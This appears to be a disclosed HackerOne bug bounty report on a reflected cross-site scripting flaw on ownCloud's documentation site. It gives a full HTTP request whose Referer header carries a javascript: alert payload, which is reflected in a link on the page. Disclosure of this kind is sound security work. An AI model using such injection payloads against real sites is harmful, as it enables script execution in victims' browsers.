@@ -1,0 +1,27 @@
+ReportLink:https://hackerone.com/reports/130951
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/sandh0t
+ReportedTo:ownCloud(owncloud)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:15.04.2016 9:20:08
+
+Summary:
+
+Hi,
+
+The Referer Header in the following request, can be used to trigger an XSS.
+
+
+GET /promote/ HTTP/1.1
+Host: doc.owncloud.org
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0
+Referer: javascript:alert('XSS');
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Content-Length: 2
+
+The Referrer Value is reflected in the page (in the "referring page" link) see the PoC, however the XSS is not trigger until the victim click in the link.
